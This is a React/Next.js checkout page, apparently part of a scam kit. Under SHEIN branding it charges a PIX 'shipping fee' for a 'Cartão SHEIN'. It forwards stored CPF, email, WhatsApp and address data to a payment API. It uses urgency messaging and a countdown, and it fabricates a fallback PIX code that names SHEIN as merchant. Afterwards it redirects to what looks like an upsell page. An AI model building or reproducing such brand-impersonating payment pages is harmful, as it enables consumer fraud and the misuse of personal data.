"use client"

import { useState, useEffect, useRef } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import Image from "next/image"
import { Copy, CheckCircle, Clock, AlertCircle, RefreshCw } from "lucide-react"

interface InvoiceData {
  id: string
  invoice_id: string
  pix: {
    payload: string
    image: string
    qr_code: string
  }
  status: {
    code: number
    title: string
    text: string
  }
  valores: {
    bruto: number
    liquido: number
  }
  vencimento: {
    dia: string
  }
  type: "real" | "simulated" | "emergency"
  external_id?: string
}

export default function CheckoutPage() {
  const [loading, setLoading] = useState(true)
  const [invoice, setInvoice] = useState<InvoiceData | null>(null)
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutos
  const [copied, setCopied] = useState(false)
  const [checking, setChecking] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const router = useRouter()
  const searchParams = useSearchParams()
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const timerRef = useRef<NodeJS.Timeout | null>(null)
  const fastCheckIntervalRef = useRef<NodeJS.Timeout | null>(null)

  // Obter parâmetros da URL
  const amount = searchParams.get("amount") || "34.90"
  const shipping = searchParams.get("shipping") || "sedex"
  const method = searchParams.get("method") || "SEDEX"

  // Adicionar estados para monitoramento
  const [paymentStatus, setPaymentStatus] = useState<
    "pending" | "confirmed" | "denied" | "expired" | "canceled" | "refunded"
  >("pending")
  const [externalId, setExternalId] = useState<string | null>(null)
  const [statusMessage, setStatusMessage] = useState("⏳ Aguardando Pagamento...")
  const [checkCount, setCheckCount] = useState(0)

  // Carregar dados do usuário e criar fatura
  useEffect(() => {
    createInvoice()
  }, [])

  // Timer countdown
  useEffect(() => {
    if (timeLeft > 0 && invoice) {
      timerRef.current = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
    } else if (timeLeft === 0) {
      setError("Tempo expirado. Gere um novo PIX.")
    }

    return () => {
      if (timerRef.current) clearTimeout(timerRef.current)
    }
  }, [timeLeft, invoice])

  // Verificação automática de pagamento - OTIMIZADA
  useEffect(() => {
    if (invoice && timeLeft > 0 && paymentStatus === "pending") {
      // Verificação rápida a cada 2 segundos nos primeiros 2 minutos
      fastCheckIntervalRef.current = setInterval(() => {
        checkPaymentFast()
      }, 2000)

      // Verificação normal a cada 10 segundos
      checkIntervalRef.current = setInterval(() => {
        checkPayment()
      }, 10000)
    }

    return () => {
      if (checkIntervalRef.current) clearInterval(checkIntervalRef.current)
      if (fastCheckIntervalRef.current) clearInterval(fastCheckIntervalRef.current)
    }
  }, [invoice, timeLeft, paymentStatus])

  // Carregar external_id quando a fatura for criada
  useEffect(() => {
    if (invoice) {
      console.log("🔍 Dados da fatura recebida:", invoice)

      let capturedExternalId = null

      // Tentar múltiplas fontes para o external_id
      if (invoice.external_id) {
        capturedExternalId = invoice.external_id
        console.log("✅ External ID encontrado na fatura:", capturedExternalId)
      } else {
        // Fallback: usar o ID da fatura como external_id
        capturedExternalId = invoice.id
        console.log("⚠️ External ID não encontrado, usando invoice.id:", capturedExternalId)
      }

      // Salvar no localStorage e no estado
      if (capturedExternalId) {
        localStorage.setItem("currentExternalId", capturedExternalId)
        setExternalId(capturedExternalId)
        console.log("💾 External ID salvo:", capturedExternalId)
      } else {
        console.error("❌ Não foi possível obter external_id!")
      }
    }
  }, [invoice])

  // Sistema de verificação automática via webhook - SUPER OTIMIZADO
  useEffect(() => {
    if (!externalId || paymentStatus === "confirmed") {
      console.log("🚫 Monitoramento não iniciado:", { externalId, paymentStatus })
      return
    }

    console.log("🚀 Iniciando monitoramento SUPER RÁPIDO para:", externalId)

    const checkWebhookConfirmation = async () => {
      try {
        setCheckCount((prev) => prev + 1)
        console.log(`🔍 [${checkCount + 1}] Verificando status via webhook para:`, externalId)

        const response = await fetch(`/api/tryplopay/payment-status?externalId=${externalId}&t=${Date.now()}`, {
          cache: "no-store",
          headers: {
            "Cache-Control": "no-cache, no-store, must-revalidate",
            Pragma: "no-cache",
          },
        })
        const result = await response.json()

        console.log(`📋 [${checkCount + 1}] Resultado da verificação:`, result)

        if (result.success && result.found) {
          const { data } = result

          console.log("✅ Status encontrado:", {
            isPaid: data.isPaid,
            isDenied: data.isDenied,
            isRefunded: data.isRefunded,
            isExpired: data.isExpired,
            isCanceled: data.isCanceled,
            statusName: data.statusName,
          })

          if (data.isPaid) {
            console.log("🎉🎉🎉 PAGAMENTO CONFIRMADO VIA WEBHOOK! 🎉🎉🎉")
            setPaymentStatus("confirmed")
            setStatusMessage("✅ Pagamento Confirmado! Redirecionando...")

            // Salvar confirmação
            localStorage.setItem("paymentConfirmed", "true")
            localStorage.setItem("paymentAmount", data.amount.toFixed(2))
            localStorage.setItem("paymentDate", data.paymentDate || new Date().toISOString())

            // Parar todos os intervalos
            if (checkIntervalRef.current) clearInterval(checkIntervalRef.current)
            if (fastCheckIntervalRef.current) clearInterval(fastCheckIntervalRef.current)
            if (timerRef.current) clearTimeout(timerRef.current)

            // Redirecionar IMEDIATAMENTE
            console.log("🚀 Redirecionando AGORA para página de ativação...")
            window.location.href = "/upp/001"
          } else if (data.isDenied) {
            console.log("❌ PAGAMENTO NEGADO VIA WEBHOOK!")
            setPaymentStatus("denied")
            setStatusMessage("❌ Pagamento Negado")
          } else if (data.isRefunded) {
            console.log("🔄 PAGAMENTO ESTORNADO VIA WEBHOOK!")
            setPaymentStatus("refunded")
            setStatusMessage("🔄 Pagamento Estornado")
          } else if (data.isExpired) {
            console.log("⏰ PAGAMENTO VENCIDO VIA WEBHOOK!")
            setPaymentStatus("expired")
            setStatusMessage("⏰ Pagamento Vencido")
          } else if (data.isCanceled) {
            console.log("🚫 PAGAMENTO CANCELADO VIA WEBHOOK!")
            setPaymentStatus("canceled")
            setStatusMessage("🚫 Pagamento Cancelado")
          }
        } else {
          console.log(`⏳ [${checkCount + 1}] Ainda aguardando confirmação para:`, externalId)
        }
      } catch (error) {
        console.log("❌ Erro na verificação:", error)
      }
    }

    // Verificar IMEDIATAMENTE
    checkWebhookConfirmation()

    // Verificar a cada 1 segundo (super rápido)
    const interval = setInterval(checkWebhookConfirmation, 1000)

    return () => {
      console.log("🛑 Parando monitoramento automático para:", externalId)
      clearInterval(interval)
    }
  }, [externalId, paymentStatus, checkCount])

  const createInvoice = async () => {
    try {
      setLoading(true)
      setError(null)

      console.log("🔄 Criando fatura PIX...")
      console.log("Parâmetros:", { amount: Number.parseFloat(amount), shipping, method })

      // Carregar dados do usuário do localStorage
      const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
      const userEmail = localStorage.getItem("userEmail") || ""
      const userWhatsApp = localStorage.getItem("userWhatsApp") || ""
      const deliveryAddress = JSON.parse(localStorage.getItem("deliveryAddress") || "{}")

      console.log("📋 Dados do usuário:", {
        nome: cpfData.nome,
        email: userEmail,
        whatsapp: userWhatsApp,
        endereco: deliveryAddress,
      })

      const response = await fetch("/api/tryplopay/create-invoice", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-cpf-data": JSON.stringify(cpfData),
          "x-user-email": userEmail,
          "x-user-whatsapp": userWhatsApp,
          "x-delivery-address": JSON.stringify(deliveryAddress),
        },
        body: JSON.stringify({
          amount: Number.parseFloat(amount),
          shipping,
          method,
        }),
      })

      const data = await response.json()

      if (data.success) {
        setInvoice(data.data)
        localStorage.setItem("tryploPayInvoice", JSON.stringify(data.data))
        localStorage.setItem("currentExternalId", data.data.external_id)
        console.log(`✅ Fatura criada: ${data.data.type} - Valor: R$ ${(data.data.valores.bruto / 100).toFixed(2)}`)
        console.log(`👤 Cliente: ${cpfData.nome || "N/A"}`)
      } else {
        throw new Error(data.error || "Erro ao criar fatura")
      }
    } catch (error) {
      console.log("❌ Erro ao criar fatura:", error)
      setError("Erro ao gerar PIX. Tente novamente.")

      // Fallback de emergência
      createEmergencyPix()
    } finally {
      setLoading(false)
    }
  }

  const createEmergencyPix = () => {
    console.log("🚨 Criando PIX de emergência...")

    const totalAmount = Number.parseFloat(amount)
    const emergencyPix = `00020101021226580014br.gov.bcb.pix2536emergency.pix.com/qr/v2/EMERGENCY${Date.now()}520400005303986540${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304EMRG`

    const emergencyInvoice: InvoiceData = {
      id: `EMG_${Date.now()}`,
      invoice_id: `EMERGENCY_${Date.now()}`,
      pix: {
        payload: emergencyPix,
        image: "/placeholder.svg?height=250&width=250",
        qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}`,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(totalAmount * 100),
        liquido: Math.round(totalAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency",
    }

    setInvoice(emergencyInvoice)
    setError(null)
    console.log(`✅ PIX de emergência criado - Valor: R$ ${totalAmount.toFixed(2)}`)
  }

  // Verificação rápida otimizada
  const checkPaymentFast = async () => {
    if (!invoice || checking || paymentStatus !== "pending") return

    try {
      const response = await fetch(
        `/api/tryplopay/check-payment?invoiceId=${invoice.id}&token=${invoice.invoice_id}&fast=true&t=${Date.now()}`,
        {
          cache: "no-store",
        },
      )
      const data = await response.json()

      if (data.success && data.data.isPaid) {
        console.log("🎉 Pagamento confirmado via verificação rápida!")
        handlePaymentConfirmed()
      }
    } catch (error) {
      console.log("❌ Erro na verificação rápida:", error)
    }
  }

  const checkPayment = async () => {
    if (!invoice || checking || paymentStatus !== "pending") return

    try {
      setChecking(true)

      const response = await fetch(
        `/api/tryplopay/check-payment?invoiceId=${invoice.id}&token=${invoice.invoice_id}&t=${Date.now()}`,
        {
          cache: "no-store",
        },
      )
      const data = await response.json()

      if (data.success && data.data.isPaid) {
        console.log("🎉 Pagamento confirmado via verificação normal!")
        handlePaymentConfirmed()
      }
    } catch (error) {
      console.log("❌ Erro ao verificar pagamento:", error)
    } finally {
      setChecking(false)
    }
  }

  const handlePaymentConfirmed = () => {
    // Limpar todos os intervalos
    if (checkIntervalRef.current) clearInterval(checkIntervalRef.current)
    if (fastCheckIntervalRef.current) clearInterval(fastCheckIntervalRef.current)
    if (timerRef.current) clearTimeout(timerRef.current)

    // Salvar confirmação
    localStorage.setItem("paymentConfirmed", "true")
    localStorage.setItem("paymentAmount", (invoice!.valores.bruto / 100).toFixed(2))

    // Atualizar status
    setPaymentStatus("confirmed")
    setStatusMessage("✅ Pagamento Confirmado! Redirecionando...")

    // Redirecionar IMEDIATAMENTE
    router.push("/upp/001")
  }

  const copyPixCode = async () => {
    if (!invoice) return

    try {
      await navigator.clipboard.writeText(invoice.pix.payload)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      console.log("❌ Erro ao copiar:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  // Adicionar indicador visual de status
  const getStatusColor = () => {
    const colors = {
      confirmed: "bg-green-100 text-green-800 border-green-300",
      denied: "bg-red-100 text-red-800 border-red-300",
      expired: "bg-yellow-100 text-yellow-800 border-yellow-300",
      canceled: "bg-gray-100 text-gray-800 border-gray-300",
      refunded: "bg-orange-100 text-orange-800 border-orange-300",
      pending: "bg-blue-100 text-blue-800 border-blue-300",
    }
    return colors[paymentStatus] || colors.pending
  }

  const getStatusText = () => {
    if (invoice?.type === "real") return "PIX Real"
    if (invoice?.type === "simulated") return "PIX Simulado"
    return "PIX Emergência"
  }

  // Função para simular pagamento (apenas para testes)
  const simulatePayment = async () => {
    if (!externalId) {
      console.log("❌ Não é possível simular: External ID não encontrado")
      return
    }

    try {
      console.log("🧪 Simulando pagamento para:", externalId)

      const response = await fetch("/api/tryplopay/simulate-payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          externalId,
          amount: Number.parseFloat(amount),
        }),
      })

      const result = await response.json()

      if (result.success) {
        console.log("✅ Pagamento simulado com sucesso!")
        // A verificação automática vai detectar o pagamento
      } else {
        console.error("❌ Erro ao simular pagamento:", result.error)
      }
    } catch (error) {
      console.error("❌ Erro na simulação:", error)
    }
  }

  if (loading) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-black mx-auto mb-4"></div>
            <h2 className="text-xl font-bold mb-2">Gerando PIX...</h2>
            <p className="text-gray-600 mb-2">Aguarde enquanto processamos seu pagamento</p>
            <div className="text-sm text-gray-500">
              <p>Valor: R$ {Number.parseFloat(amount).toFixed(2)}</p>
              <p>Método: {method}</p>
            </div>
          </div>
        </div>
      </main>
    )
  }

  if (error && !invoice) {
    return (
      <main className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-lg shadow-md p-8 max-w-md w-full mx-4">
          <div className="text-center">
            <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-bold mb-2 text-red-600">Erro no Pagamento</h2>
            <p className="text-gray-600 mb-4">{error}</p>
            <button
              onClick={createInvoice}
              className="bg-black text-white px-6 py-2 rounded-lg hover:bg-black/90 transition-colors"
            >
              Tentar Novamente
            </button>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
            <h1 className="text-2xl font-bold mb-2">Pagamento PIX</h1>
          </div>

          {/* Mensagem de Atenção */}
          <div className="bg-yellow-100 border-l-4 border-yellow-500 rounded-lg p-4 mb-6">
            <div className="flex items-start">
              <div className="flex-shrink-0">
                <span className="text-yellow-600 text-lg">⚠️</span>
              </div>
              <div className="ml-3">
                <h3 className="text-yellow-800 font-bold text-sm mb-2">ATENÇÃO! ⏳</h3>
                <div className="text-yellow-700 text-sm space-y-2">
                  <p>
                    Para garantir o envio do seu <strong>Cartão SHEIN</strong>, este pagamento deve ser confirmado em
                    até <strong>2 horas</strong>. Após esse prazo, a sua solicitação será automaticamente cancelada, sem
                    custos adicionais.
                  </p>
                  <p>
                    Ao confirmar o pagamento do frete, você garante todos os benefícios exclusivos:{" "}
                    <strong>cashback, parcelamento sem juros e uso imediato do cartão</strong>.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Timer */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-center space-x-2">
              <Clock className="w-5 h-5 text-yellow-600" />
              <span className="font-bold text-yellow-800">Tempo restante: {formatTime(timeLeft)}</span>
            </div>
          </div>

          {/* Status em Tempo Real - OTIMIZADO */}
          <div className={`border-2 rounded-lg p-4 mb-6 ${getStatusColor()}`}>
            <div className="flex items-center justify-center space-x-2">
              <div
                className={`w-3 h-3 rounded-full ${paymentStatus === "pending" ? "animate-pulse bg-blue-500" : paymentStatus === "confirmed" ? "bg-green-500" : "bg-red-500"}`}
              ></div>
              <span className="font-bold">{statusMessage}</span>
            </div>
            {externalId && (
              <div className="text-xs mt-2 text-center opacity-75 space-y-1">
                <p>ID: {externalId}</p>
                <p>Verificações: {checkCount} | Modo: SUPER RÁPIDO ⚡</p>
              </div>
            )}
          </div>

          {/* Valor */}
          <div className="text-center mb-6">
            <p className="text-gray-600 mb-1">Valor a pagar</p>
            <p className="text-3xl font-bold text-green-600">R$ {Number.parseFloat(amount).toFixed(2)}</p>
            <p className="text-sm text-gray-500">Frete {method} - Cartão SHEIN</p>
          </div>

          {/* QR Code */}
          <div className="text-center mb-6">
            <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
              <Image
                src={invoice?.pix.qr_code || "/placeholder.svg?height=200&width=200"}
                alt="QR Code PIX"
                width={200}
                height={200}
                className="mx-auto"
              />
            </div>
            <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
          </div>

          {/* Código PIX */}
          <div className="mb-6">
            <label className="block text-sm font-medium text-gray-700 mb-2">Ou copie o código PIX:</label>
            <div className="flex space-x-2">
              <input
                type="text"
                value={invoice?.pix.payload || ""}
                readOnly
                className="flex-1 p-3 border border-gray-300 rounded-lg bg-gray-50 text-sm font-mono"
              />
              <button
                onClick={copyPixCode}
                className={`px-4 py-3 rounded-lg font-medium transition-colors ${
                  copied ? "bg-green-500 text-white" : "bg-black text-white hover:bg-black/90"
                }`}
              >
                {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
              </button>
            </div>
            {copied && <p className="text-green-600 text-sm mt-2">✅ Código copiado!</p>}
          </div>

          {/* Status */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-center space-x-2">
              <div className="animate-pulse w-3 h-3 bg-blue-500 rounded-full"></div>
              <span className="text-blue-800 font-medium">Aguardando pagamento...</span>
            </div>
            <p className="text-blue-700 text-sm mt-1">Verificamos automaticamente a cada 1 segundo ⚡</p>
          </div>

          {/* Instruções */}
          <div className="space-y-3 text-sm text-gray-600">
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                1
              </span>
              <span>Abra o app do seu banco</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                2
              </span>
              <span>Escaneie o QR Code ou cole o código PIX</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                3
              </span>
              <span>Confirme o pagamento</span>
            </div>
            <div className="flex items-start space-x-2">
              <span className="bg-black text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mt-0.5">
                4
              </span>
              <span>Aguarde a confirmação automática</span>
            </div>
          </div>

          {/* Botão de Teste (apenas em desenvolvimento) */}
          {process.env.NODE_ENV === "development" && externalId && (
            <button
              onClick={simulatePayment}
              className="w-full mt-4 bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-4 rounded-lg transition-colors"
            >
              🧪 SIMULAR PAGAMENTO APROVADO (TESTE)
            </button>
          )}

          {/* Botão de Verificação Manual */}
          <button
            onClick={checkPayment}
            disabled={checking}
            className="w-full mt-6 bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium py-3 px-4 rounded-lg transition-colors disabled:opacity-50"
          >
            {checking ? (
              <div className="flex items-center justify-center">
                <RefreshCw className="w-4 h-4 animate-spin mr-2" />
                Verificando...
              </div>
            ) : (
              "Verificar Pagamento"
            )}
          </button>
        </div>
      </div>
    </main>
  )
}
